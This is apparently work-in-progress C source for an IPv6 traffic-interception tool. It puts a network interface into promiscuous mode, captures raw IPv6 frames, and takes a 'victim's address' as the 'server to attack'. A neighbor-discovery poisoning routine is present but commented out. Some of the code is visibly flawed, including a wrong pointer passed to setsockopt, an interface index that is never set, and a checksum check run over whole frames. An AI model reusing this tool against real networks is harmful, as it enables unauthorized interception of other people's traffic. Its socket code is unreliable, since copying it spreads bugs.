#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include <linux/if_packet.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>

#include <victims.h>
#include <packets.h>
#include <device.h>

#define DEBUG 0

static int raw_socket(int proto) {
	int rawsock;

	if ((rawsock = socket(PF_PACKET, SOCK_RAW, htons(proto))) < 0) {
		perror("Error creating raw socket: ");
		exit(-1);
	}

	return rawsock;
}

static int bind_socket_to_device(char *device, int rawsock) {
	struct packet_mreq *pkt;
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));

	strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);

	/* Go promisc */
	if ((ioctl(rawsock, SIOCGIFFLAGS, &ifr)) < 0) {
		perror("Error reading flags from device: ");
		exit(-1);
	}

	ifr.ifr_flags |= IFF_PROMISC;
	if ((ioctl(rawsock, SIOCSIFFLAGS, &ifr)) < 0) {
		perror("Error setting flags to device: ");
		exit(-1);
	}

	pkt = (struct packet_mreq *)malloc(sizeof(struct packet_mreq));
	memset((struct packet_mreq *)pkt, 0, sizeof(struct packet_mreq));
	pkt->mr_ifindex = ifr.ifr_ifindex;
	pkt->mr_type = PACKET_MR_PROMISC;
	setsockopt(rawsock, SOL_PACKET, PACKET_MR_PROMISC, (char *)&pkt,
			sizeof(struct packet_mreq));

	free(pkt);

	return 1;
}

void packet_action(char *packet, int len) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct tcphdr *tcp;
	char addr[INET6_ADDRSTRLEN];
	int vlen = len;

	eth = (struct ethhdr *)packet;
	if (!in_cksum((unsigned char *)eth, vlen)) {
		if (DEBUG)
			printf("eth: CRC ERROR\n");
		return;
	}
/*
	if (ntohs(eth->h_proto) != ETH_P_IPV6) {
		// Not an IPv6 packet! :-)
		//printf("Not an IPv6 packet (%x)\n", ntohs(eth->h_proto));
		return;
	}
*/
	printf("\n- PACKET START (%d) -\n", len);

	if (memcmp(&device.hwaddr, eth->h_source, sizeof(struct ether_addr)) == 0)
		printf("Packet for me? :-)\n");

	printf("Ether src: %s\n", ether_ntoa((struct ether_addr *)eth->h_source));
	printf("Ether dest: %s\n", ether_ntoa((struct ether_addr *)eth->h_dest));

	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	vlen -= sizeof(struct ethhdr);

	if (!in_cksum((unsigned char *)ip6, vlen)) {
		if (DEBUG)
			printf("IPv6: CRC ERROR\n");
		return;
	}

	if (ip6->ip6_dst.s6_addr) {
		inet_ntop(AF_INET6, ip6->ip6_dst.s6_addr, addr, INET6_ADDRSTRLEN);
		printf("To: %s\n", addr);
	}

	memset(addr, 0, INET6_ADDRSTRLEN);

	if (ip6->ip6_src.s6_addr) {
		inet_ntop(AF_INET6, ip6->ip6_src.s6_addr, addr, INET6_ADDRSTRLEN);
		printf("From: %s\n", addr);
	}

	switch (ip6->ip6_nxt) {
		case IPPROTO_ICMPV6:
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("ICMPv6 DEBUG:\n");
			printf("Type: %d\n", icmpv6->icmp6_type);
			/*
			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT && cvictim.poisoned == 0)
				if (solicitation_to_svictim(icmpv6)) {
					cvictim.poisoned = 1;
					poison_cvictim(ip6->ip6_src.s6_addr);	// This should be a thread
				}
			*/
			break;
		case IPPROTO_TCP:
			tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("TCP DEBUG:\n");
			printf("Dest Port: %d\n", tcp->dest);
			printf("Src Port: %d\n", tcp->source);
			break;
		default:
			printf("DEBUG: %d\n", ip6->ip6_nxt);
			break;
	}
	printf("- PACKET END -\n\n");
}

int main(int argc, char **argv) {
	int raw, len;
	char packet_buffer[2048];
	struct sockaddr_ll packet_info;
	char server_victim[INET6_ADDRSTRLEN];
	int packet_info_size = sizeof(packet_info);
	char *teste;

	if (argc < 3) {
		printf("Usage: %s <interface> <victim's address>\n", argv[0]);
		exit(0);
	}

	load_device_info(argv[1]);
	dump_device_info();

	/* create the raw socket */
	/* Maybe someday we will support other protocols */
	//raw = raw_socket(ETH_P_ALL);
	raw = raw_socket(ETH_P_IPV6);

	/* Bind socket to interface and going promisc */
	bind_socket_to_device(device.name, raw);

	/* Get number of packets to sniff from user */
	if (inet_pton(AF_INET6, argv[2], &svictim.ipv6) <= 0) {
		printf("Error setting victim's address\n");
		exit(EXIT_FAILURE);
	}
	inet_ntop(AF_INET6, &svictim.ipv6, server_victim, INET6_ADDRSTRLEN);
	printf("Server to attack: %s\n", server_victim);

	/* START DEBUG TESTE */
	teste = alloc_pkt2big();
	packet_action(teste, sizeof(struct ethhdr) +
						sizeof(struct ip6_hdr) +
						sizeof(struct icmp6_hdr));
	/* STOP DEBUG */

	while ((len = recvfrom(raw, packet_buffer, 2048, 0,
						(struct sockaddr*)&packet_info,
						(socklen_t *)&packet_info_size)) >= 0) {
			packet_action(packet_buffer, len);
	}

	return 0;
}
